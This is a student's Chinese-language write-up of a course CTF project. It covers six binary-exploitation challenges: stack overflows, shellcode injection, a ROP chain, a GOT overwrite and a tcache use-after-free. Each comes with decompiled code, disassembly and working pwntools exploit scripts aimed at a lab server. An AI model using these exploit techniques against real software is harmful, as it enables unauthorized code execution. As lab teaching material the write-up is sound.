# CTF Project 1

> [name=作者：中大資工碩一 王聖允]

## helloworld（Sample）

### Decomopile
```clike=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[48]; // [rsp+0h] [rbp-30h] BYREF

  init(argc, argv, envp);
  puts("Do you like Chiikawa?");
  puts("Try to say helloworld to Hachiware!");
  gets(v4);
  return 0;
}
```

```clike=
int helloworld()
{
  return execve("/bin/sh", 0, 0);
}
```

### objdump
```asm=
00000000004011fb <helloworld>:
  4011fb:	f3 0f 1e fa          	endbr64
  4011ff:	55                   	push   rbp
  401200:	48 89 e5             	mov    rbp,rsp
  401203:	ba 00 00 00 00       	mov    edx,0x0
  401208:	be 00 00 00 00       	mov    esi,0x0
  40120d:	48 8d 05 f4 0d 00 00 	lea    rax,[rip+0xdf4]        # 402008 <_IO_stdin_used+0x8>
  401214:	48 89 c7             	mov    rdi,rax
  401217:	e8 64 fe ff ff       	call   401080 <execve@plt>
  40121c:	90                   	nop
  40121d:	5d                   	pop    rbp
  40121e:	c3                   	ret
```

希望進到這個 function 地址，取得 Shell 權限

### Solution Sample Code
```python=
from pwn import *

context.arch = 'amd64'

p = remote('ctf.adl.tw', 10000)

helloworld = 0x4011fb
payload = p64(helloworld)*512

p.sendline(payload)

p.interactive()
p.close()
```

解釋：
* helloworld 地址為 0x4011fb
* 將這個地址包裝成 64bits（8 Bytes），重複 512 次
* 當作輸入值，造成 overflow 覆蓋掉 return 值

### Results
* Running processes
![圖片](https://hackmd.io/_uploads/BkGbGG-Ceg.png)
* Get Flag
![圖片](https://hackmd.io/_uploads/ByHtzM-All.png)
![圖片](https://hackmd.io/_uploads/BJWTzzWAxx.png)

## helloworld_again

### Decompile

```clike=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[48]; // [rsp+0h] [rbp-30h] BYREF

  init(argc, argv, envp);
  puts("Say helloworld to Usagi!");
  __isoc99_scanf("%s", s);
  if ( strlen(s) > 0x30 )
  {
    // 簡化了一點，這裡本來會印出一隻烏薩奇
    puts("\nBuffer Over Flow !!! huhhhhhhhhhhhhhhhhhhhhh~");
    puts("If you see this message, please try it again!!!\n");
    exit(0);
  }
  if ( strcmp(s, "helloworld") )
  {
    puts("This is not helloworld.");
    puts("huhhhhhhhhhhhhhhhhhhhhh~");
    exit(0);
  }
  return 0;
}
```

一樣有一個 function:
```clike=
int helloworld()
{
  return execve("/bin/sh", 0, 0);
}
```

* 這次有檢查 string length
    * Buffer 長度給定 48
    * 檢查 `strlen(s) > 0x30`，0x30 = 48 (Decimal)，照理說長度大於 48 的 String 會被擋掉，但只要提早給一個 `"\0"` 會判斷為 String 已經結束，後面就可以塞東西
* 且會 string compare 檢查輸入是否為 `"helloworld"`
* 所以要給一個 `"helloworld"` + `"\0"` + 用 `helloworld()` 的位址覆蓋到 return addr（除了蓋滿 Buffer 還要蓋掉 Saved RBP 之後再加 8 bytes）
    ```
    [ rbp + 8 ] ← return address
    [ rbp     ] ← saved RBP      (8 bytes)
    [ rbp - 0x30 .. rbp - 1 ] ← s[48]
    ```

### objdump

```asm=
000000000040125b <helloworld>:
  40125b:	f3 0f 1e fa          	endbr64
  40125f:	55                   	push   %rbp
  401260:	48 89 e5             	mov    %rsp,%rbp
  401263:	ba 00 00 00 00       	mov    $0x0,%edx
  401268:	be 00 00 00 00       	mov    $0x0,%esi
  40126d:	48 8d 05 94 0d 00 00 	lea    0xd94(%rip),%rax        # 402008 <_IO_stdin_used+0x8>
  401274:	48 89 c7             	mov    %rax,%rdi
  401277:	e8 44 fe ff ff       	call   4010c0 <execve@plt>
  40127c:	90                   	nop
  40127d:	5d                   	pop    %rbp
  40127e:	c3                   	ret
```
位址在 `0x40125b`

### Solution

```python=
from pwn import *

context.arch = 'amd64'

p = remote('ctf.adl.tw', 10001)

prefix = b"helloworld\0"
stuffing = cyclic(48-11+8)
addr = p64(0x40125b)

payload = flat(prefix ,stuffing, addr)

# prompt = p.recvuntil(b"Usagi!\n")
# print(prompt.decode(errors='ignore'))
# p.send(payload)

p.sendafter(b"Usagi!\n", payload)
# Will read until the string, and send payload
p.interactive()

p.close()

```

解釋：
* Buffer Size (48) - `b"helloworld\0"` (11) + Saved RBP (8)

### Results
![圖片](https://hackmd.io/_uploads/H172LmWCgx.png)


## ShellCode

### Decompile
![圖片](https://hackmd.io/_uploads/Bk-d4mWAeg.png)
失敗：位址 401230 的地方

### objdump
```asm=
00000000004011db <main>:
  4011db:	f3 0f 1e fa          	endbr64
  4011df:	55                   	push   %rbp
  4011e0:	48 89 e5             	mov    %rsp,%rbp
  4011e3:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
  4011ea:	b8 00 00 00 00       	mov    $0x0,%eax
  4011ef:	e8 82 ff ff ff       	call   401176 <init>
  4011f4:	48 8d 05 0d 0e 00 00 	lea    0xe0d(%rip),%rax        # 402008 <_IO_stdin_used+0x8>
  4011fb:	48 89 c7             	mov    %rax,%rdi
  4011fe:	e8 5d fe ff ff       	call   401060 <puts@plt>
  401203:	48 8d 85 30 ff ff ff 	lea    -0xd0(%rbp),%rax
  40120a:	ba c8 00 00 00       	mov    $0xc8,%edx
  40120f:	48 89 c6             	mov    %rax,%rsi
  401212:	bf 00 00 00 00       	mov    $0x0,%edi
  401217:	e8 54 fe ff ff       	call   401070 <read@plt>
  40121c:	48 8d 85 30 ff ff ff 	lea    -0xd0(%rbp),%rax
  401223:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401227:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  40122b:	b8 00 00 00 00       	mov    $0x0,%eax
  401230:	ff d2                	call   *%rdx
  401232:	b8 00 00 00 00       	mov    $0x0,%eax
  401237:	c9                   	leave
  401238:	c3                   	ret
```

### 附檔 shellcode.c
```clike=
#include <stdio.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    return;
}


int main() {
	init();
	char buf[200];

	puts("Try to input something in this buffer!!!");
	read(0, buf, 200);

	void (*func)() = (void (*)())buf;
	(*func)();

	return 0;
}
```

失敗地方應該是對應到 line 20
這邊會直接將輸入的 Buffer 當成 Function 拿來執行

### Solution
```python=
from pwn import *

context.arch = 'amd64'
# /bin/sh shellcode（pwntools 會組譯）
# sc = asm('''
#     /* execve("/bin/sh", 0, 0) */
#     xor rax, rax
#     mov rbx, 0x68732f6e69622f
#     push rbx
#     mov rdi, rsp
#     xor rsi, rsi
#     xor rdx, rdx
#     mov rax, 59      /* __NR_execve */
#     syscall
# ''')

# generate shellcode
# (Optional) NOP (x90 no operation) padding to 200 bytes
sc = asm(shellcraft.execve('/bin/sh')) #.ljust(200, b'\x90')

io = remote('ctf.adl.tw', 10002)

# io.recvuntil(b"buffer!!!\n")
# io.send(sc)
io.sendafter(b"buffer!!!\n", sc)

io.interactive()
```

### Results
![圖片](https://hackmd.io/_uploads/BkhgEXZ0gl.png)

## Gadgethunter

### Decompile
```clike=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _QWORD v4[4]; // [rsp+0h] [rbp-20h] BYREF

  memset(v4, 0, sizeof(v4));
  setbuf(stdout, 0, envp);
  IO_puts("Enter your secret message:");
  _libc_read(0, v4, 208);
  _printf("Here is what you entered:\n%s\n", (const char *)v4);
  return 0;
}
```

Buffer 只有 4 Bytes
但是卻在 Line 8 讀入 208 Bytes

### CheckSec

![圖片](https://hackmd.io/_uploads/Bylz7Pm0xl.png)

不能直接將產生的 ShellCode 放在 Buffer 並 Return 過去
因為 NX Enabled：會將非 Code 區域標為不可執行

### objdump

```asm=
0000000000401795 <main>:
  401795:	f3 0f 1e fa          	endbr64
  401799:	55                   	push   %rbp
  40179a:	48 89 e5             	mov    %rsp,%rbp
  40179d:	48 83 ec 20          	sub    $0x20,%rsp
  4017a1:	48 c7 45 e0 00 00 00 	movq   $0x0,-0x20(%rbp)
  4017a8:	00 
  4017a9:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
  4017b0:	00 
  4017b1:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
  4017b8:	00 
  4017b9:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
  4017c0:	00 
  4017c1:	48 8b 05 28 4f 0c 00 	mov    0xc4f28(%rip),%rax        # 4c66f0 <stdout>
  4017c8:	be 00 00 00 00       	mov    $0x0,%esi
  4017cd:	48 89 c7             	mov    %rax,%rdi
  4017d0:	e8 3b 2b 01 00       	call   414310 <setbuf>
  4017d5:	48 8d 3d 28 68 09 00 	lea    0x96828(%rip),%rdi        # 498004 <_IO_stdin_used+0x4>
  4017dc:	e8 2f 0a 01 00       	call   412210 <_IO_puts>
  4017e1:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  4017e5:	ba d0 00 00 00       	mov    $0xd0,%edx
  4017ea:	48 89 c6             	mov    %rax,%rsi
  4017ed:	bf 00 00 00 00       	mov    $0x0,%edi
  4017f2:	e8 69 da 04 00       	call   44f260 <__libc_read>
  4017f7:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  4017fb:	48 89 c6             	mov    %rax,%rsi
  4017fe:	48 8d 3d 1a 68 09 00 	lea    0x9681a(%rip),%rdi        # 49801f <_IO_stdin_used+0x1f>
  401805:	b8 00 00 00 00       	mov    $0x0,%eax
  40180a:	e8 31 9e 00 00       	call   40b640 <_IO_printf>
  40180f:	b8 00 00 00 00       	mov    $0x0,%eax
  401814:	c9                   	leave
  401815:	c3                   	ret
  401816:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40181d:	00 00 00 
```

Canary found **but not in `<main>` section**
經過測試也確定可以不用繞過 Canary 可以直接蓋到 return 值

Stack排列：
```
High
[Return Addr: 8 Bytes]
[Saved rbp: 8 Bytes] 
[Buffer: 32 Bytes] 
Low
```
**rip_offset = 40**

### 解題思路

題目叫做 GadgetHunter
應該是要找程式內部已經存在的 Gadget 來用（導向可執行區段某些指令的地址）

參考資料：
https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/

本來想透過 `elf.plt` 與 `elf.got` 來取得 libc 位址
並推算出 system@libc 的位址並 return，取得 shell 權限

但是兩者都是空的，`ldd` 也顯示 `not a dynamic executable`
該 Binary 採 statically linking，libc leak 不可行

`readelf -s ./gadgethunter | grep system` 查看 symbols 也不包含 system 函式可用

**最終選用 execve syscall 來執行 "/bin/sh"**

**Tricky Shortcut：** https://github.com/JonathanSalwan/ROPgadget
> 可以自動 Find Gadgets 然後直接產生 ROP chain

**x86-64 的 execve syscall 要求：**
* rdi = 指向 pathname（char *）
* rsi = 指向 argv（char **，即指向字串指標陣列）
* rdx = 指向 envp（char **，即環境變數指標陣列）
* rax = syscall number（59）
* 呼叫 syscall 後 kernel 會執行 execve（成功不會回傳）

### 產生 ROP Chain（有分段加上註解）

```python=
# Command: ROPgadget --binary ./gadgethunter --ropchain

#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

# rsi = *(.data)
p += pack('<Q', 0x0000000000409eee) # pop rsi ; ret
p += pack('<Q', 0x00000000004c60e0) # @ .data

# rax = b'/bin//sh'
p += pack('<Q', 0x000000000044fcc7) # pop rax ; ret
p += b'/bin//sh'

# Move qword(8Bytes) from rax to ptr[rsi]（寫進 .data 區段）
p += pack('<Q', 0x0000000000452435) # mov qword ptr [rsi], rax ; ret

# rsi = *(.data+8)
p += pack('<Q', 0x0000000000409eee) # pop rsi ; ret
p += pack('<Q', 0x00000000004c60e8) # @ .data + 8

# 清除 rax
p += pack('<Q', 0x000000000043ea19) # xor rax, rax ; ret
# Move qword(8Bytes) from rax to ptr[rsi]（從 .data+8 開始寫入）
p += pack('<Q', 0x0000000000452435) # mov qword ptr [rsi], rax ; ret

# rdi = *(.data)
p += pack('<Q', 0x0000000000401ebf) # pop rdi ; ret
p += pack('<Q', 0x00000000004c60e0) # @ .data

# rsi = *(.data+8)
p += pack('<Q', 0x0000000000409eee) # pop rsi ; ret
p += pack('<Q', 0x00000000004c60e8) # @ .data + 8

# rdx = *(.data+8), rbx = padding
# （rbx 不會用到，只是只找到這個 gadget 能用，所以填一個 Padding）
p += pack('<Q', 0x0000000000485c0b) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004c60e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding

### 開始將 rax 加到 59
# 清除 rax
p += pack('<Q', 0x000000000043ea19) # xor rax, rax ; ret

# 把 rax 加到 59
p += pack('<Q', 0x00000000004782d0) # add rax, 1 ; ret
### 以下省略 58 次一樣的指令

p += pack('<Q', 0x0000000000401c74) # syscall
```

把這些全部覆寫到原本的 return adress 位置之後
當碰到 main section 的 ret 指令時，會連環 pop 並放進 rip 執行
（因為每個指令都接著 ret，就會不斷從 stack pop 並執行，rsp 往高位移動）

但是
```python=
# 把 rax 加到 59
p += pack('<Q', 0x00000000004782d0) # add rax, 1 ; ret
### 以下省略 58 次一樣的指令
```
這一段重複太多次，需要簡化才能在 (208-40)=168 Bytes 內才行
上面每一行產生的資料 8 Bytes => 要在 21 行內

所以利用之前出現的 `pop rax` 簡化成：
```python=
# rax = 59
p += pack('<Q', 0x000000000044fcc7) # pop rax ; ret
p += p64(0x3B) # set rax to 59
```

### Solution

我覺得指令還可以簡化（`rsi = *(.data+8)` 重複、不需 rdx 等問題）
以下為最終簡化過的 code：

```python=
from pwn import *
from struct import pack

# execve generated by ROPgadget (It's my savior)
# Padding goes here
# 已知 Offset 為 40 可以蓋到 Return Address
p = b'A' * 40

"""
x86-64 的 execve syscall 要求
rdi = 指向 pathname（char *）
rsi = 指向 argv（char **，即指向字串指標陣列）
rdx = 指向 envp（char **，即環境變數指標陣列）
rax = syscall number（59）
呼叫 syscall 後 kernel 會執行 execve（成功不會回傳）
"""

# rsi = *(.data)
p += pack('<Q', 0x0000000000409eee) # pop rsi ; ret
p += pack('<Q', 0x00000000004c60e0) # @ .data

# Move from rax to ptr[rsi]（b'/bin//sh' 寫進 .data 區段）
p += pack('<Q', 0x000000000044fcc7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x0000000000452435) # mov qword ptr [rsi], rax ; ret

# rsi = *(.data+8)
p += pack('<Q', 0x0000000000409eee) # pop rsi ; ret
p += pack('<Q', 0x00000000004c60e8) # @ .data + 8

# 清除 rax 為 0 並將 *(.data+8) 填入 0
# p += pack('<Q', 0x000000000043ea19) # xor rax, rax ; ret
# p += pack('<Q', 0x0000000000452435) # mov qword ptr [rsi], rax ; ret

# rdi = *(.data) (Now is 'b'/bin//sh'')
p += pack('<Q', 0x0000000000401ebf) # pop rdi ; ret
p += pack('<Q', 0x00000000004c60e0) # @ .data

# Set rax = 59
p += pack('<Q', 0x000000000044fcc7) # pop rax ; ret
p += p64(0x3B) # set rax to 59
p += pack('<Q', 0x0000000000401c74) # syscall

exe_path = './gadgethunter'

# 可切換到 remote
pr = remote('ctf.adl.tw', 10004)
# pr = process(exe_path)

pr.sendafter(b"message:\n", p)

pr.interactive()
```

### Results

![圖片](https://hackmd.io/_uploads/rJyKbamCxx.png)

## Doors

### Decompile
```clike=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("There are many doors.\nChoose one and enter the correct password than you will got the treasure !!");
  printf("The door number you  want to choose : ");
  __isoc99_scanf("%d", &v4);
  printf("Password : ");
  __isoc99_scanf("%lld", (char *)&doors + 8 * v4);
  puts("Oh no,password is wrong,try again ~");
  return 0;
}
```

另外有：
```clike=
int treasure()
{
  return execve("/bin/sh", 0, 0);
}
```

可以依靠輸入的 v4 值跳至要覆蓋的地址
並在第二個 scanf 輸入要覆蓋成什麼值（讀入 `long long` 到 `&doors + 8 * v4`）

### objdump

```asm=
000000000040125f <main>:
  40125f:	f3 0f 1e fa          	endbr64
  401263:	55                   	push   rbp
  401264:	48 89 e5             	mov    rbp,rsp
  401267:	48 83 ec 10          	sub    rsp,0x10
  40126b:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
  401272:	00 00 
  401274:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  401278:	31 c0                	xor    eax,eax
  40127a:	b8 00 00 00 00       	mov    eax,0x0
  40127f:	e8 52 ff ff ff       	call   4011d6 <init>
  401284:	48 8d 05 85 0d 00 00 	lea    rax,[rip+0xd85]        # 402010 <_IO_stdin_used+0x10>
  40128b:	48 89 c7             	mov    rdi,rax
  40128e:	e8 fd fd ff ff       	call   401090 <puts@plt>
  401293:	48 8d 05 de 0d 00 00 	lea    rax,[rip+0xdde]        # 402078 <_IO_stdin_used+0x78>
  40129a:	48 89 c7             	mov    rdi,rax
  40129d:	b8 00 00 00 00       	mov    eax,0x0
  4012a2:	e8 09 fe ff ff       	call   4010b0 <printf@plt>
  4012a7:	48 8d 45 f4          	lea    rax,[rbp-0xc]
  4012ab:	48 89 c6             	mov    rsi,rax
  4012ae:	48 8d 05 ea 0d 00 00 	lea    rax,[rip+0xdea]        # 40209f <_IO_stdin_used+0x9f>
  4012b5:	48 89 c7             	mov    rdi,rax
  4012b8:	b8 00 00 00 00       	mov    eax,0x0
  4012bd:	e8 1e fe ff ff       	call   4010e0 <__isoc99_scanf@plt>
  4012c2:	48 8d 05 d9 0d 00 00 	lea    rax,[rip+0xdd9]        # 4020a2 <_IO_stdin_used+0xa2>
  4012c9:	48 89 c7             	mov    rdi,rax
  4012cc:	b8 00 00 00 00       	mov    eax,0x0
  4012d1:	e8 da fd ff ff       	call   4010b0 <printf@plt>
  4012d6:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4012d9:	48 98                	cdqe
  4012db:	48 8d 14 c5 00 00 00 	lea    rdx,[rax*8+0x0]
  4012e2:	00 
  4012e3:	48 8d 05 b6 2d 00 00 	lea    rax,[rip+0x2db6]        # 4040a0 <doors>
  4012ea:	48 01 d0             	add    rax,rdx
  4012ed:	48 89 c6             	mov    rsi,rax
  4012f0:	48 8d 05 b7 0d 00 00 	lea    rax,[rip+0xdb7]        # 4020ae <_IO_stdin_used+0xae>
  4012f7:	48 89 c7             	mov    rdi,rax
  4012fa:	b8 00 00 00 00       	mov    eax,0x0
  4012ff:	e8 dc fd ff ff       	call   4010e0 <__isoc99_scanf@plt>
  401304:	48 8d 05 ad 0d 00 00 	lea    rax,[rip+0xdad]        # 4020b8 <_IO_stdin_used+0xb8>
  40130b:	48 89 c7             	mov    rdi,rax
  40130e:	e8 7d fd ff ff       	call   401090 <puts@plt>
  401313:	b8 00 00 00 00       	mov    eax,0x0
  401318:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  40131c:	64 48 2b 14 25 28 00 	sub    rdx,QWORD PTR fs:0x28
  401323:	00 00 
  401325:	74 05                	je     40132c <main+0xcd>
  401327:	e8 74 fd ff ff       	call   4010a0 <__stack_chk_fail@plt>
  40132c:	c9                   	leave
  40132d:	c3                   	ret
```

treasure：
```asm=
000000000040123b <treasure>:
  40123b:	f3 0f 1e fa          	endbr64
  40123f:	55                   	push   rbp
  401240:	48 89 e5             	mov    rbp,rsp
  401243:	ba 00 00 00 00       	mov    edx,0x0
  401248:	be 00 00 00 00       	mov    esi,0x0
  40124d:	48 8d 05 b4 0d 00 00 	lea    rax,[rip+0xdb4]        # 402008 <_IO_stdin_used+0x8>
  401254:	48 89 c7             	mov    rdi,rax
  401257:	e8 64 fe ff ff       	call   4010c0 <execve@plt>
  40125c:	90                   	nop
  40125d:	5d                   	pop    rbp
  40125e:	c3                   	ret
```

重點：
* `lea    rax,[rip+0x2db6]        # 4040a0 <doors>`
* treasure：`0x40123b`

### CheckSec

![圖片](https://hackmd.io/_uploads/HJQ1Q6mAex.png)

一樣 NX Enabled，有 Canary
且 Main function 尾端有呼叫 __stack_chk_fail@plt，所以不能蓋到 Canary 值

### 解題嘗試

一開始的想法：`rbp` 在 `0x7fffffffd5e0`
直接從 doors 跳到 `rbp + 8` 蓋 return address

```python=
from pwn import *

# context.log_level = 'DEBUG'
pr = process('./doors')

treasure = 0x40123b     # execve("/bin/sh", 0, 0);
door = 0x4040a0
rbp = 0x7fffffffd5e0
ret = rbp+8

offset = (ret-door) // 8

pr.sendlineafter("choose : ", str(offset))

pr.sendlineafter("Password : ", str(treasure))

pr.wait()
pr.corefile
pr.interactive()
```

但是，兩者離太遠，offset 無法成功輸入 int 內（會 overflow 成負的）

所以最終依靠 dynamic link 的 libc（覆蓋 got table 對應的 addr）

### Solution

```python=
from pwn import *

# context.log_level = 'debug'
exe = './doors'
elf = ELF(exe)

treasure = 0x40123b

door = 0x4040a0

puts_got = elf.got['puts']
log.info(f'puts@GOT = {hex(puts_got)}')

# v4 = (puts_got - door) // 8
distance = puts_got - door
if distance % 8 != 0:
    log.warning("Not aligned with 8 Bytes")
v4 = distance // 8

log.info(f'v4 (index to write) = {v4} ({hex(v4 & 0xffffffff)})')
log.info(f'write addr = {hex(door + 8 * v4)} (expect to write to {hex(puts_got)})')

# p = process(exe)
p = remote("ctf.adl.tw", 10003)

p.recvuntil(b"choose : ", timeout=2)
p.sendline(str(v4))

p.recvuntil(b"Password : ", timeout=2)
p.sendline(str(treasure))

p.interactive()
```

### Result

![圖片](https://hackmd.io/_uploads/SkIOdVB0el.png)


## Donate

### Decompile

```clike=
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // [rsp+4h] [rbp-Ch]
  int v4; // [rsp+8h] [rbp-8h]
  int v5; // [rsp+8h] [rbp-8h]
  int v6; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. Add donate");
      puts("2. Say donate");
      printf("option > ");
      v6 = read_int();
      if ( v6 != 1 )
        break;
      printf("input index(1~3) > ");
      v4 = read_int();
      if ( v4 > 0 || v4 <= 3 )
      {
        printf("input size of your name > ");
        v3 = read_int();
        add_donate((unsigned int)v4, v3);
        printf("input your name > ");
        read(0, *(void **)(*((_QWORD *)&donate_bars + v4) + 8LL), (int)v3);
      }
    }
    if ( v6 == 2 )
    {
      printf("input index(1~3) > ");
      v5 = read_int();
      if ( v5 > 0 || v5 <= 3 )
      {
        (**((void (***)(void))&donate_bars + v5))();
        printf("%s", *(const char **)(*((_QWORD *)&donate_bars + v5) + 8LL));
        clear_donate((unsigned int)v5);
      }
    }
  }
}
```

**v4 與 v5 的 條件有問題，只要是任何數字都可以**
兩者皆作為指向 heap 空間的 pointer 的 offset

令外 v3 作為另外一塊存放 name 的空間的 size


```clike=
int read_int()
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  read(0, buf, 0x10u);
  return atoi(buf);
}
```

```clike=
void *__fastcall add_donate(int a1, int a2)
{
  __int64 v2; // rbx
  void *result; // rax

  *((_QWORD *)&donate_bars + a1) = malloc(0x10u);
  **((_QWORD **)&donate_bars + a1) = say;
  v2 = *((_QWORD *)&donate_bars + a1);
  result = malloc(a2);
  *(_QWORD *)(v2 + 8) = result;
  return result;
}
```

**[donate_bars（Address 0x4040b0）+ v4]** is a pointer
points to 16 Bytes space allocated in heap
stores 2 pointers

first 8 Bytes points to function `say()`
second 8 Bytes points to another space (size v3) allocated to store input name

```clike=
int say()
{
  return printf("Thnak you, ");
}
```

```clike=
void __fastcall clear_donate(int a1)
{
  free(*(void **)(*((_QWORD *)&donate_bars + a1) + 8LL));
  free(*((void **)&donate_bars + a1));
}
```

```clike=
int magic_func()
{
  return system("/bin/sh");
}
```

### objdump

得知：
* donate_bars 在 0x4040b0
* magic_func 在 0x4013a9

完整請見：[File](https://github.com/yzu1103309/ctf-dump/blob/main/donate.txt)

### checksec

![圖片](https://hackmd.io/_uploads/HJaxmVCAgg.png)

### Heap Status

![圖片](https://hackmd.io/_uploads/Hy2qqVA0gl.png)
這是用 gdb 進行 debug 時的輸出，但運行時實際位址不是如此，而是隨機

### 目前 pwn

```python=
from pwn import *
import time

REMOTE = True
DEBUG = False
GDB = False

gdbscript = r'''
# b *main+168
b *main+180
b *main+237
b *main+390
'''
if DEBUG:
    context.log_level = 'debug'

if REMOTE:
    p = remote("ctf.adl.tw", 10005)
else:
    p = process('./donate')
    if GDB:
        gdb.attach(p, gdbscript=gdbscript)

def add(idx, size, content):
    if len(content) < size:
        content = content.ljust(size, b'\x00')
    elif len(content) > size:
        content = content[:size]

    p.sendlineafter(b'option > ', b'1')
    p.sendlineafter(b'index(1~3) > ', str(idx).encode())
    p.sendlineafter(b'size of your name > ', str(size).encode())
    p.sendafter(b'your name > ', content)

def say(idx):
    p.sendlineafter(b'option > ', b'2')
    p.sendlineafter(b'index(1~3) > ', str(idx).encode())

add(1, 5, b'A'*0x3)
add(2, 32, b'A'*0x3)
say(2)
say(1)
add(3, 32, b'A'*0x3)

add(4, 8, p64(0x4013a9))

say(2)

p.interactive()

```

but we **need a way to leak the actual heap address, **
then it will do the job

But I don't know how lol

**BTW, if turning off ASLR locally, this code works ...**

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

**But the actual case is not that easy?**

### 結構

![圖片](https://hackmd.io/_uploads/HJonE3yy-e.png)
綠色是我們可以自訂的部份

目前策略：
* 建立一個圖中的結構，offset 隨便（Code 中用 1）
* 將 magic_func 地址寫在 input_name
* 如果用**與建立時相同的 offset**，他會執行 say()，但現在我們**強制利用 offset 指到 [Addr to heap*(name)]**，就歲變成執行 input_name 指向的 function

但最大問題就是：Remote ASLR 開啟，不知如何 Leak 真實 Heap 位址

### Final Solution

其實利用 **malloc 不同大小的 input_name 空間**，
使其在 heap 建立不同大小的 chunk，並相繼 free 掉這些空間
（釋放的空間會以 List 的形式被連接到 tcache 中）
重新 Allocate 時，如果所需大小符合條件，會先從 tcache 中取得 chunks 來利用

巧妙的操縱 size，使某個指標**原本指向寫著 `say()`** 位址的 chunk
釋放、回收再利用後，**變成是指向使用者輸入的 payload（`magic()` 的位址）**

```python=
from pwn import *
import time

REMOTE = True
DEBUG = False
GDB = True

gdbscript = r'''
# b *main+168
b *main+180
b *main+237
b *main+390
'''

if DEBUG:
    context.log_level = 'debug'

if REMOTE:
    p = remote("ctf.adl.tw", 10005)
else:
    p = process('./donate')
    if GDB:
        gdb.attach(p, gdbscript=gdbscript)

def add(idx, size, content):
    if len(content) < size:
        content = content.ljust(size, b'\x00')
    elif len(content) > size:
        content = content[:size]

    p.sendlineafter(b'option > ', b'1')
    p.sendlineafter(b'index(1~3) > ', str(idx).encode())
    p.sendlineafter(b'size of your name > ', str(size).encode())
    p.sendafter(b'your name > ', content)

def say(idx):
    p.sendlineafter(b'option > ', b'2')
    p.sendlineafter(b'index(1~3) > ', str(idx).encode())

add(1, 5, b'A'*3)
add(2, 32, b'B'*30)
say(2)
say(1)
add(3, 32, b'C'*30)

add(4, 8, p64(0x4013a9))

say(2)

p.interactive()
```

### Code Explaination

**chunks 的結構：**
![圖片](https://hackmd.io/_uploads/S1fDszw1Wg.png)
[圖片來源：Medium](https://medium.com/@b3rm1nG/heap-exploit-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-d724d0afa59b)

**prev_size** 與 **size** 欄位**各佔 8 Bytes**

而 chunks 中的 data 欄位會以 **16 Bytes 為單位增長** 並對齊
所以一個 chunk 最小就是 **32 Bytes（<prev_size=8>+<size=8>+<data=16>）**

另外，**當目前此 chunk 是 in_use 狀態時**，**下一個 chunk 的 prev_size** 欄位也會被用來存資料
（被 Free 以後才需要用來紀錄上一個 chunk 的大小）
所以當 `所需 data_size <= 24` 時，allocated chunk size 都是 32 bytes
當所需大小超過 24 Bytes 時，就會多 allocate 16 Bytes，後面只要不夠每次都是以 16 Bytes 為單位增長。

#### GDB 實際演示 (pwntool 綁定 gdb 測試)

* Code：`add(1, 5, b'A'*0x3)` 結束
![圖片](https://hackmd.io/_uploads/SJsuNXP1Ze.png)
`needed <= 24`，所以 allocate 32 bytes chunk
`<donate_bar+8>` 指向 `0x1d0442a0`

* Code：`add(2, 32, b'B'*30)` 結束
![圖片](https://hackmd.io/_uploads/Sy6MSmvJWe.png)
`24 < needed <= 40`，所以 allocate 48 bytes chunk
`<donate_bar+16>` 指向 `0x1d0442e0`

* Code：`say(2)` 結束
![圖片](https://hackmd.io/_uploads/r1kv8mw1be.png)
![圖片](https://hackmd.io/_uploads/ry1xwQvJZl.png)
chunk `0x1d0442e0` 和 `0x1d044300` 被放到 tcache 中，等待重複利用
`<donate_bar+16>` 依舊指向 `0x1d0442e0`，就算已經被 free
所以我們期待 `0x1d0442e0` 這塊 chunk 可以被重複利用，且前 8 bytes 寫入 `magic()` Address，呼叫 `say(2)` 就可以進入 `magic()`。

* Code：`say(1)` 結束
![圖片](https://hackmd.io/_uploads/Hkjkc7DJWg.png)
chunk `0x1d0442a0` 和 `0x1d0442c0` 也被放到 tcache 中（在開頭）

* Code：`add(3, 32, b'C'*30)` 結束
![圖片](https://hackmd.io/_uploads/rJa2s7vJbe.png)
![圖片](https://hackmd.io/_uploads/B1YmnmvyZx.png)
從 tache 分別取出 chunk `0x1d0442a0` 和 `0x1d044300` 重複利用
`<donate_bar+24>` 指向 `0x1d0442a0`
同時剛剛的 `<donate_bar+8>` 依舊指向 `0x1d0442a0`

* Code：`add(4, 8, p64(0x4013a9))` 結束
![圖片](https://hackmd.io/_uploads/r1tQCQPkbl.png)
這是成功的關鍵：請求的大小剛好都可以從 tcache 中取得
剛好可以寫入 `magic()` 地址（`0x4013a9`）在 `0x1d0442e0`
而 `<donate_bar+32>` 指向 `0x1d0442c0`
